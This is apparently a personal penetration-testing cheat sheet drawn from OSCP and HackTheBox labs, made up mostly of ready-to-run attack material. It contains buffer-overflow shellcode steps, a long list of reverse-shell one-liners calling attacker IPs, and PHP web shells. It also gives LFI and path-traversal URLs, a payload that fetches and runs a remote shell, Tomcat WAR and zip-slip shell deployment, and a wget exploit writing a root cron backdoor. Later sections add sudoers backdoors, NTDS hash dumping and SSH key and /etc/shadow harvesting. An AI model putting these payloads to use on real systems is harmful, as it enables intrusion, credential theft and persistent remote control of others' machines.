badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10" "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20" "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30" "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40" "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50" "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60" "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70" "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80" "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90" "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0" "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0" "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0" "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0" "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0" "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0" "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
with script _badchars.py and 
"!mona compare -a esp -f C:\Users\IEUser\Desktop\badchar_test.bin"
    5.1 AWESOME WAY TO CHECK BADCHARS (https://bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/):
        a. !mona config -set workingfolder c:\logs\%p
        b. !mona bytearray -b "\x00\x0d"
        c. Copy from c:\logs\%p\bytearray.txt to python exploit and run again
        d. !mona compare -f C:\logs\%p\bytearray.bin -a 02F238D0 (ESP address)
        e. In " data", before unicode chars it shows badchars.
 6. Find JMP ESP with "!mona modules" or "!mona jmp -r esp" or "!mona jmp -r esp -cpb '\x00\x0a\x0d'" find one with security modules "FALSE"

    6.1 Then, "!mona find -s "\xff\xe4" -m PROGRAM/DLL-FALSE"
    6.2 Remember put the JMP ESP location in reverse order due to endianness: 5F4A358F will be \x8f\x35\x4a\x5f


7. Generate shellcode and place it:
msfvenom -p windows/shell_reverse_tcp LHOST=10.11.1.111 LPORT=4433 -f python –e x86/shikata_ga_nai -b "\x00"

msfvenom -p windows/shell_reverse_tcp lhost=10.11.1.111 lport=443 EXITFUNC=thread -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -f python -v shellcode

8. Final buffer like:
buffer="A"*2606 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + shellcode
```

```text
################ sample 1 ################################################
#!/usr/bin/python

import socket,sys

if len(sys.argv) != 3:
    print("usage: python fuzzer.py 10.11.1.111 PORT")
    exit(1)

payload = "A" * 1000

ipAddress = sys.argv[1]
port = int(sys.argv[2])

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ipAddress, port))
    s.recv(1024)
    print "Sending payload"
    s.send(payload)
    print "Done"
    s.close()
except:
    print "Error"
    sys.exit(0)

################ sample 2 ################################################
#!/usr/bin/python
import time, struct, sys
import socket as so

try:
    server = sys.argv[1]
    port = 5555
except IndexError:
    print "[+] Usage %s host" % sys.argv[0]
    sys.exit()

req1 = "AUTH " + "\x41"*1072
s = so.socket(so.AF_INET, so.SOCK_STREAM)
try:
     s.connect((server, port))
     print repr(s.recv(1024))
     s.send(req1)
     print repr(s.recv(1024))
except:
     print "[!] connection refused, check debugger"
s.close()
```

### Find xploits - Searchsploit and google

Where there are many exploits for a software, use google. It will automatically sort it by popularity.

```bash
site:exploit-db.com apache 2.4.7

# Remove dos-exploits

searchsploit Apache 2.4.7 | grep -v '/dos/'
searchsploit Apache | grep -v '/dos/' | grep -vi "tomcat"

# Only search the title (exclude the path), add the -t
searchsploit -t Apache | grep -v '/dos/'
```

### Reverse Shells

```bash
# Netcat Linux
nc -e /bin/sh target 4443

#Netcat Windows
nc -e cmd.exe target 4443

# Bash
bash -i >& /dev/tcp/target/4443 0>&1

# Linux 
Use "rlwrap" for see all previous commands in your reverse shell
bash -i >& /dev/tcp/10.11.1.111/4443 0>&1
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.1.111 4443 >/tmp/f
nc -e /bin/sh 10.11.1.111 4443

# Python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.1.111",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.1.111",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

#################################
### UDP Reverse Shell (python ###
#################################

import subprocess;subprocess.Popen(["python", "-c", 'import os;import pty;import socket;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.connect((\"10.10.14.4\", 1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(\"HISTFILE\",\"/dev/null\");pty.spawn(\"/bin/sh\");s.close()'])

# And set your listener:

socat file:`tty`,echo=0,raw udp-listen:1234

Reference: joker box (htb) (https://github.com/infodox/python-pty-shells)

###################
### Other Shell ###
###################

__import__('os').system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.9 4433 >/tmp/f')-1\

############
### Perl ###
############

perl -e 'use Socket;$i="10.11.1.111";$p=4443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

###############
### Windows ###
###############

nc -e cmd.exe 10.11.1.111 4443
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.11',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

#############################
### PHP most simple Linux ###
#############################

<?php $sock = fsockopen("10.11.1.111",1234); $proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);?>

######################################
### PHP reverse shell in some file ###
######################################

php -r '$sock = fsockopen("10.10.14.4",1337); exec("/bin/sh -i <&3 >&3 2>&3");'

#############################################################################
### Remote Desktop (Remote Desktop for windows with share and 85% screen) ###
#############################################################################

rdesktop -u username -p password -g 85% -r disk:share=/root/ target

########### 
### PHP ###
###########

 - PHP command injection from GET Request
<?php echo system($_GET["cmd"]);?>

 - Alternative
<?php echo shell_exec($_GET["cmd"]);?>

####################################
### HTTP Covert Channel RevShell ###
####################################

HTTP-revshell se ha desarrollado para ser utilizada en ejercicios de RedTeam y/o pentest para poner a prueba las capacidades de detección de las soluciones de seguridad que una empresa puede tener implementadas.

¡Testear!

Reference: https://www.hackplayers.com/2020/06/http-revshell-c2-covert-channel.html
```

### Elastix and vtigercrm

```text
#################
### vtigercrm ###
#################

    =====================================
    === LFI (vtigercrm version 5.1.0) ===
    =====================================

https://10.10.10.7/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/passwd%00

# Path with information about Asterik

https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action

# File Upload (vtigercrm version 5.1.0)

Path: "Settings --> Company Details --> Edit" and upload a PHP reverse shell with extension JPG

Reference: Beep (htb)

####################################
### Elasticsearch Kibana Console ###
####################################

    ==========================
    === LFI CVE-2018-17246 ===
    ==========================

GET /api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd
```

### NVMS

```text
# Metasploit

msf5 > search nvms
msf5 auxiliary(scanner/http/tvt_nvms_traversal) > set FILEPATH <path_for_read_file>
msf5 auxiliary(scanner/http/tvt_nvms_traversal) > set RHOSTS <ip_victim>
msf5 auxiliary(scanner/http/tvt_nvms_traversal) > run

# NSClient++

https://www.exploit-db.com/exploits/46802

Reference: servmon box (htb)
```

### Magento

```text
# Magento Scan

https://github.com/steverobbins/magescan

# For exploitation of Magento see "SwagShop" box (htb)
```

### phpLiteAdmin

```text
# If you have the version 1.9

searchsploit phpliteadmin

# Do this

1) Login with credentials in the application

2) Create new database

3) Create new table with "name" and "number of fields"

4) Set "field" with "type" INTEGER 

5) Set "Default Value" of table field:

    <?php system("wget http://10.10.14.4/shell.txt -O /tmp/shell.php; php /tmp/shell.php"); ?>

6) Create table

7) With the LFI previously found, go to 
    Path to database: /var/tmp/cgonzalo

8) With your netcat set previously and the server python, you get your "shell.txt" (reverse shell) and get the revShell in your netcat

Reference: nineveh box (htb)
```

### Squid Server Proxy

```text
- Squid is a caching and forwarding HTTP web proxy

- Configure in your web browser your server sroxy for use with this Squid proxy

# Inside of "tftp", you can try found this files of Squid

get /etc/squid (no one response, this means that it's OK)
get /etc/squid.conf
get /etc/squid.cfg
get /etc/squid/squid.cfg
get /etc/squid/squid.conf

# When you use this Squid proxy, please visit the local IP

http://127.0.0.1/ (from your web browser with Squid proxy active)
https://127.0.0.1/ (from your web browser with Squid proxy active)

Reference: joker box (htb)

==============================
=== Squid with Proxychains ===
==============================

- If you have credentials for SSH, but not access, with Proxychains and Squid Proxy you can pivoting for connect against SSH

# Add configuration in file of Proxychains

nano /etc/proxychains.conf

# Comments all final configuration and let alone just your line

...
http <SquidProxyServer> <port>
http 10.10.10.67 3128
...

# Test this with nmap

proxychains nmap -sT -p22 10.10.10.67

        And

proxychains nmap -sT -p22 127.0.0.1

# Now, connect with Proxychains and SSH

proxychains ssh cobb@127.0.0.1

Reference: inception box (htb)
```

### Apache and Tomcat

```text
==============================
=== Path common for Tomcat ===
==============================

http://yourdomain.com/manager/html

========================
=== Interesting Path ===
========================

cd /etc/apache2/
cat /etc/apache2/sites-enabled/000-default.conf
cat /var/log/apache2/access.log
cat /usr/share/tomcat9/etc/tomcat-users.xml
cat /etc/tomcat9/tomcat-users.xml
cd /var/lib/tomcat9
cd /usr/share/tomcat9
cat /usr/share/doc/tomcat9-common/RUNNING.txt.gz
cat /var/lib/tomcat9/webapps/ROOT/index.html

# With RFI:

http://10.10.10.67/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/apache2/sites-enabled/000-default.conf
http://megahosting.htb/news.php?file=../../../../../../../../../../../../../../../../../../../../usr/share/tomcat9/etc/tomcat-users.xml

Reference: inception box (htb) | tabby box (htb)

==============================
=== Credentials by Default ===
==============================

user: tomcat
pass: s3cr3t

# Once you get access in the section "Tomcat Manager", you have TWO ways for exploit this:


a) Using Upload Functionality Web

    1) msfvenom -l payloads | grep jsp (search payload)
    2) msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.27 LPORT=1337 -f war > shell.war (create your revShell)
    3) rlwrap -lnvp 1337 (set your netcat)
    4) From panel "Tomcat Manager --> WAR file to deploy" upload your file and "Deploy"
    5) Now from section "Tomcat Manager --> Applications" click in "shell" and get revShell

b) With disabled Upload functionality Web

    1) msfvenom -l payloads | grep jsp (search payload)
    2) msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.27 LPORT=1337 -f war > shell.war (create your revShell)
    3) rlwrap -lnvp 1337 (set your netcat)
    4) curl --user 'tomcat:$3cureP4s5w0rd123!' --upload-file shell.war "http://megahosting.htb:8080/manager/text/deploy?path=/shell.war"
    5) Go to "http://megahosting.htb:8080/shell.war/" in the webBrowser and get revShell
```

### Zip Slip

```text
- You can put a file into my zip with path ../../../../../../../../../../etc/passwd, and it will unzip and try to overwrite the /etc/passwd file on the host

# For win a webShell, create a PHP webShell

root@kali# cat cmd.php
<?php system($_REQUEST['cmd']); ?>

# Copy this in your "html" directory

root@kali# cp /your/path/ /var/www/html/

# Add it to a zip file, but with a lot of "../" to ensure that I get to the system root. 

NOTE: Remember, Linux will ignore attempts to change to a parent directory from "/", so "/../../../" is the same as "/"

root@kali# zip <fileName>.zip ../../../../../../var/www/html/cmd.php

# You can check and make sure it stored correctly using "unzip -l" to list the contents

root@kali# unzip -l /path/for/your/file/<fileName>.zip

# Upload your ZIP file and try get a command

curl http://10.10.10.101/cmd.php?cmd=id

# Get a revShell

nc -lnvp 443

curl http://10.10.10.101/cmd.php --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/<ipAttacker>/443 0>&1'"

===========================================
=== Put your SSH key in the victim host ===
===========================================

- If you notice that the process you ran for exploit this vuln is with "root" permissions, then try this:

# Create your key

ssh-keygen (without password)

# Put your "id_rsa.pub" in a file "authorized_keys" inside of your root ssh directory

cat /root/.ssh/id_rsa.pub > /root/.ssh/authorized_keys

# Create your file ZIP add the "../" in the name of the file

zip <yourfile>.zip ../../../../../../../../../../../../../root/.ssh/authorized_keys

# Upload your file ZIP and try connect throught SSH

ssh -i /root/.ssh/id_rsa root@<victimHost>

---

Reference: 
    ghoul box (htb)
    https://0xdf.gitlab.io/2019/10/05/htb-ghoul.html#map-of-ghoul

Resource: https://nakedsecurity.sophos.com/2018/06/06/the-zip-slip-vulnerability-what-you-need-to-know/
```

### Gogs

```text
- Download: https://github.com/TheZ3ro/gogsownz

# Exploit RCE (Vulnerable version "Gogs Version: 0.11.66.0916")

Reference: ghoul box (htb)
```

### Portainer

```text
================================
=== Portainer Version 1.11.1 ===
================================

# If you have this version of Portainer, you can try this

https://github.com/portainer/portainer/issues/493

# 1: Reset password without authorization

--------------------------------
POST /api/users/admin/init HTTP/1.1
Host: localhost:9001
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://localhost:9001/
Content-Type: application/json;charset=utf-8
Content-Length: 39
Connection: close
Cookie: lang=en-US

{"username":"admin","password":"<yourNewCredential>"}
--------------------------------

# 2: login with new credential

Reference: oz box (htb)
Resource: https://github.com/portainer/portainer/issues/493
```

### Bludit

```text
============================
=== Bludit version 3.9.2 ===
============================

    #########################
    ### Brute Force Login ###
    #########################

# If you have a valid user, you can brute force password with this scripts

https://github.com/0xCGonzalo/g0ld/blob/master/Scripts/BruteForceBludit/bruteForce.py

# Or

https://rastating.github.io/bludit-brute-force-mitigation-bypass/

    #########################
    ### Get Reverse Shell ###
    #########################

# You can use the module of metasploit and get a revShell

msf > use linux/http/bludit_upload_images_exec

Reference: blunder box (htb)
```

### OpenEMR

```text
========================
=== OpenEMR v5.0.1.3 ===
========================

    ###########################
    ### SQL Injection Blind ###
    ###########################

- If you have this version (v5.0.1.3) or less, you can try exploit this.

1) Click in "register" button

2) Go to:
    http://<domainVulnerableOpenEMR>/portal/add_edit_event_user.php?eid=1'

3) If you see a "error in SQL" you can exploit this with sqlmap

    #########################
    ### Get Reverse Shell ###
    #########################

- Once you've logged in the administration panel, go to:

1) Administration --> Files

2) Select in "File management" the option of "letter_templates/custom_pdf.php"

3) Get your revShell PHP tiny here:
    <?php
    exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'");

4) Go to (with your netcat set):
    http://<yourSiteOpenEMR>/sites/default/letter_templates/custom_pdf.php

5) Got revShell

Reference: cache box (htb)
Resource:
    https://www.open-emr.org/wiki/images/1/11/Openemr_insecurity.pdf
    https://www.youtube.com/watch?v=DJSQ8Pk_7hc
```

### Spring Boot

```text
###################
### Spring Boot ###
###################

    ========================
    === Search in Shodan ===
    ========================

# Search for the following favicon hash in Shodan to find Spring Boot servers deployed in the target organization:

org:YOUR_TARGET http.favicon.hash:116323821

# Then check for exposed actuators. 

    ======================
    === Env & Heapdump ===
    ======================

# If "/env" is available, you can probably achieve RCE. 
# If /heapdump is accessible, you may find private keys and tokens.

https://target.com/env
https://target.com/heapdump
etc.

- Pro tip: Check for all these default built-in actuators. Some of them may be exposed and contain interesting information.
```

## **Privilege escalation**

### Common

```text
##############
### Docker ###
##############

# See some devices

arp -an

# If you run 

sudo -l

# And see

(ALL) NOPASSWD: /usr/bin/docker network inspect *
(ALL) NOPASSWD: /usr/bin/docker network ls

# You can use this command and learn about the Docker network (show all the networks currently running)

sudo /usr/bin/docker network ls  

# See Dockers information

sudo /usr/bin/docker network inspect prodnet

# See information about Bridge Docker

sudo /usr/bin/docker network inspect bridge

# Found files "sdf"

find . -iname "*.sdf"

# ...

https://www.notsosecure.com/anatomy-of-a-hack-docker-registry/
```

#### Set up Webserver

```text
python -m SimpleHTTPServer 8080
https://github.com/sc0tfree/updog
updog
```

#### Set up FTP Server

```text
# Install pyftpdlib
pip install pyftpdlib

# Run (-w flag allows anonymous write access)
python -m pyftpdlib -p 21 -w
```

#### Set up TFTP

```text
# In Kali
atftpd --daemon --port 69 /tftp

# In reverse Windows
tftp -i 10.11.1.111 GET nc.exe
nc.exe -e cmd.exe 10.11.1.111 4444

http://10.11.1.111/addguestbook.php?LANG=../../xampp/apache/logs/access.log%00&cmd=nc.exe%20-e%20cmd.exe%2010.11.0.105%204444
```

#### Upgrade Shell

```text
• script /dev/null -c bash
• Ctrl+Z
• stty raw -echo
• f+g
• reset
• xterm
• export TERM=xterm
• export SHELL=bash
```

Verify that NANO gives us the proportions, otherwise from our terminal:

```text
• stty -a
```

Import the row and column values:

```text
• stty rows [NUMBER] columns [NUMBER]
```

#### Insecure Functions

Search inside a "file" the next dangerous functions:

PHP:

```text
escapeshellcmd
eval
exec
inject_code
shell_exec
```

#### Alternate Data Stream

```text
# When a file have 0 BYTES

# Alternate Data Streams or ADSs are a feature of the NTFS file system that allow you to store meta information with a file, without the need to use a separate file to store it.

=== Windows ====

# Create a normal text file

echo "texto dentro del archivo" >archivo.txt

# Create an ADS from file.txt

echo "flujo alternativo de datos de archivo" >archivo.txt:flujo.txt

# The normal way to view a text file by console is to use the "type" command like this:

type archivo.txt
texto dentro del archivo

# However, it does not work with ADS

type archivo.txt:flujo.txt
The filename, directory name, or volume label syntax is incorrect.

# In order to see the alternative flow of data it is necessary to use the "more" command in this way:

1) more < archivo.txt:flujo.txt
flujo alternativo de datos de archivo

2) more "archivo.txt:flujo.txt"
flujo alternativo de datos de archivo

# It is also possible to edit the alternative flow of data using a graphic text editor as in Windows Notepad, only you have to open it by console in this way:

notepad archivo.txt:flujo.txt
```

#### Port Knocking

```text
# Run "ps auxww" and you see " (this technique have a Firewall behind)

/usr/sbin/knockd

# Search path of the process

locate knockd.conf

# And read rhe file

cat /etc/knockd.conf 

# The file is

[options]
 logfile = /var/log/knockd.log
 interface = ens33

[openSSH]
 sequence = 571, 290, 911    (<-- IMPORTANT PART)
 seq_timeout = 5
 start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn

[closeSSH]
 sequence = 911,290,571
 seq_timeout = 5
 start_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT
 tcpflags = syn

# If you touch the port "571, 290, 911", the program execute the command below

 start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT

# Now, from machine attacker, execute this

for i in 571 290 911; do 
nmap -Pn --host-timeout 100 --max-retries 0 -p $i 10.10.10.43 >/dev/null 
done; ssh -i id_rsa amrois@10.10.10.43

Port 22 OPEN!

# Another way

- 01
root@root:# ports="40809 50212 46969"; for port in $ports; do echo "a" | nc -u -w 1 10.10.10.96 ${port}; sleep 0.5; done; echo "knock done"; nc -w 1 -nvv 10.10.10.96 22

- 02
root@root:# for i in <port> <port> <port>; do nc -zu <ip> $i; done
root@root:# nc -zv <ip>

Reference: oz box (htb)
```

#### LTrace

```text
- ltrace is use for debugging one binary

# Use

ltrace <binary>
```

#### NTDS

```text
# By stealing the Ntds.dit file (Active Directory’s database) an attacker can extract a copy of every user’s password hash and subsequently act as any user in the domain.

# If you get two files (.dit & .bin)
    1° file: 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
    2° file: 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin

# You can decrypt this

impacket-secretsdump -ntds <fileNTDS>.dit -system <systemNTDS>.bin LOCAL

Reference: kotarak box (htb)
Resource: https://attack.stealthbits.com/ntds-dit-security-active-directory
```

#### wget

```text
# If you have the version of GNU Wget < 1.18, you can try exploit this

1) attackers-server# mkdir /tmp/ftptest
2) attackers-server# cd /tmp/ftptest
3) attackers-server# cat <<_EOF_>.wgetrc
   post_file = /etc/shadow
   output_document = /etc/cron.d/wget-root-shell
   _EOF_
4) attackers-server# python -m pyftpdlib -p21 -w
5) attackers-server# wget https://raw.githubusercontent.com/xl7dev/Exploit/master/Wget/wget-exploit.py
6) Modify your exploit
7) Edit this parameters:
    HTTP_LISTEN_IP = '192.168.57.1'
    HTTP_LISTEN_PORT = 80
    FTP_HOST = '192.168.57.1'
    FTP_PORT = 21

    ROOT_CRON = "* * * * * root /usr/bin/id > /root/hacked-via-wget \n"

   To:
    HTTP_LISTEN_IP = '0.0.0.0'
    HTTP_LISTEN_PORT = 80
    FTP_HOST = '<attacker_host>'
    FTP_PORT = 21

    ROOT_CRON = "* * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.27 1338 >/tmp/f \n"

8) Send to victim machine
9) attackers-server# chmod +x exploit.py
10) attackers-server# python exploit.py (try with "authbind python exploit.py" if you have problem to execute this exploit)
11) Get revSHell

Reference: kotarak box (htb)
Resource: https://www.exploit-db.com/exploits/40064
```

#### Git

```text
- If you see with "ls -la" and found:

    roy@zetta:/etc/rsyslog.d/$ ls -la
        .git
        pgsql.conf
Run it:

====================
=== Git Commands ===
====================
git status
git log
git show

git show <commit>:<fileConfig>
git show e25cc20218f99abd68a2bf06ebfa81cd7367eb6a:pgsql.conf (example)

Reference: zetta box (htb)
```

#### Ethereum

```text
# Smart Contract Exploitation

Reference: chainsaw box (htb)
Resource: https://www.dappuniversity.com/articles/web3-py-intro
```

#### IPFS

```text
====================
=== Use in Linux ===
====================

# To list the local references

ipfs refs local 

# On every hash to list the contents

ipfs ls <QmZrd1ik8Z2F5iSZPDA2cZSmaZkHFEE4jZ3MiQTDKHAiri>

# To get the file

ipfs get <QmViFN1CKxrg3ef1S8AJBZzQ2QS8xrcq3wHmyEfyXYjCMF>
```

### Linux

Now we start the whole enumeration-process over gain.

* Kernel exploits
* Programs running as root
* Installed software
* Weak/reused/plaintext passwords
* Inside service
* Suid misconfiguration
* World writable scripts invoked by root
* Unmounted filesystems
* Look in /var/backups
* Look in /etc/fstab y en mount

Less likely

* Private ssh keys
* Bad path configuration
* Cronjobs

#### Useful commands

```text
====================================
=== Search files with EXTENSIONS ===
====================================

find / -type d -name .<extension> 2>/dev/null
find / -type d -name .git 2>/dev/null (example)

======================
=== Spawning shell ===
======================

python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/sh")'
echo os.system('/bin/bash')
/bin/sh -i
perl -e 'exec "/bin/sh";'
perl: exec "/bin/sh";
ruby: exec "/bin/sh"
lua: os.execute('/bin/sh')

(From within vi)
:!bash
:set shell=/bin/bash:shell

(From within nmap)
!sh

import os
os.system('nc -e /bin/sh 10.10.14.4 4321')

===============================
=== Access to more binaries ===
===============================

export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

========================
=== Set up webserver ===
========================

cd /root/oscp/useful-tools/privesc/linux/privesc-scripts; python -m SimpleHTTPServer 8080

==========================
=== Download all files ===
==========================

wget http://10.11.1.111:8080/ -r; mv 10.11.1.111:8080 exploits; cd exploits; rm index.html; chmod 700 LinEnum.sh linprivchecker.py unix-privesc-check

============================
=== Writable directories ===
============================

/tmp
/var/tmp

===========================
=== Add user to sudoers ===
===========================

useradd hacker
passwd hacker
echo "hacker ALL=(ALL:ALL) ALL" >> /etc/sudoers

# Or

/root/etc# chmod 600 sudoers
/root/etc# echo "<username> ALL=(ALL) NOPASSWD: ALL" >> sudoers

================================
=== See the Operating System ===
================================

cat /etc/os-release

===========================
=== If you're in docker ===
===========================

arp -an
```

#### Basic info

```text
=====================
=== Good Commands ===
=====================

uname -a
env
hostname -I
id
cat /proc/version
cat /etc/issue
cat /etc/passwd
cat /etc/group
groups
cat /etc/shadow
cat /etc/hosts

========================
=== Users with login ===
========================
grep -vE "nologin" /etc/passwd

================================
=== Priv Enumeration Scripts ===
================================

LinEnum.sh  
linpeas.sh  
linuxprivchecker.py  
lse.sh  
pspy64.sh
unix-privesc-check

=======================================
=== Search files with range of data ===
=======================================

find / -type f -newermt 2017-01-30 ! -newermt 2017-12-31 -ls 2>/dev/null

Reference: shrek box (htb)
```

#### Kernel exploits

```text
site:exploit-db.com kernel version

perl /root/oscp/useful-tools/privesc/linux/Linux_Exploit_Suggester/Linux_Exploit_Suggester.pl -k 2.6

python linprivchecker.py extended
```

#### Programs running as root

Look for webserver, mysql or anything else like that.

```text
# Metasploit
ps

# Linux
ps aux
```

#### Installed software

```text
/usr/local/
/usr/local/src
/usr/local/bin
/opt/
/home
/var/
/usr/src/

# Debian
dpkg -l

# CentOS, OpenSuse, Fedora, RHEL
rpm -qa (CentOS / openSUSE )

# OpenBSD, FreeBSD
pkg_info
```

#### Weak/reused/plaintext passwords

* Check database config-file
* Check databases
* Check weak passwords

```text
username:username
username:username1
username:root
username:admin
username:qwerty
username:password
```

* Check plaintext

```text
./LinEnum.sh -t -k password
```

#### Inside service

```text
##########################################
### Connections Actives in a PC In/Out ###
##########################################

netstat -putona
netstat -anlp
netstat -ano
```

#### Suid misconfiguration

Binary with suid permission can be run by anyone, but when they are run they are run as root!

Example programs:

```text
nmap
vim
nano
```

```text
# SUID
find / -perm -4000 -type f 2>/dev/null

# ALL PERMS
find / -perm -777 -type f 2>/dev/null

# SUID for current user
find / perm /u=s -user `whoami` 2>/dev/null
find / -user root -perm -4000 -print 2>/dev/null

# Writables for current user/group
find / perm /u=w -user `whoami` 2>/dev/null
find / -perm /u+w,g+w -f -user `whoami` 2>/dev/null
find / -perm /u+w -user `whoami` 2>/dev/nul

# Dirs with +w perms for current u/g
find / perm /u=w -type -d -user `whoami` 2>/dev/null
find / -perm /u+w,g+w -d -user `whoami` 2>/dev/null
```

#### Unmounted filesystems

Here we are looking for any unmounted filesystems. If we find one we mount it and start the priv-esc process over again.

```text
mount -l
```

#### Cronjob

Look for anything that is owned by privileged user but writable for you

```text
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
```

#### SSH Keys

Check all home directories

```text
cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key
```

#### Bad path configuration

Require user interaction

#### Find plain passwords

```text
grep -rnw '/' -ie 'pass' --color=always
grep -rnw '/' -ie 'DB_PASS' --color=always
grep -rnw '/' -ie 'DB_PASSWORD' --color=always
grep -rnw '/' -ie 'DB_USER' --color=always
```

#### Scripts

**SUID**

```text
int main(void){
  setresuid(0, 0, 0);
  system("/bin/bash");
}

# Compile
gcc suid.c -o suid
```

**PS Monitor for cron**

```text
#!/bin/bash

# Loop by line
IFS=$'\n'

old_process=$(ps -eo command)

while true; do
    new_process=$(ps -eo command)
    diff <(echo "$old_process") <(echo "$new_process") | grep [\<\>]
    sleep 1
    old_process=$new_process
done
```

#### Linux Privesc Tools

* [GTFOBins](https://gtfobins.github.io/)
* [LinEnum](https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh)
* [LinuxExploitSuggester](https://gitlab.com/kalilinux/packages/linux-exploit-suggester/blob/kali/master/Linux_Exploit_Suggester.pl)
* [linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py)

#### Linux Precompiled Exploits

* [kernel-exploits](https://github.com/lucyoa/kernel-exploits)

#### Nohup

Nohup is a command that tells the Linux system not to stop another command once it has started.

Syntax:

```text
nohup sh [your-script.sh] &
```

Notice the "&" at the end of the command. That moves the command to the bottom, freeing up the terminal you're working on.

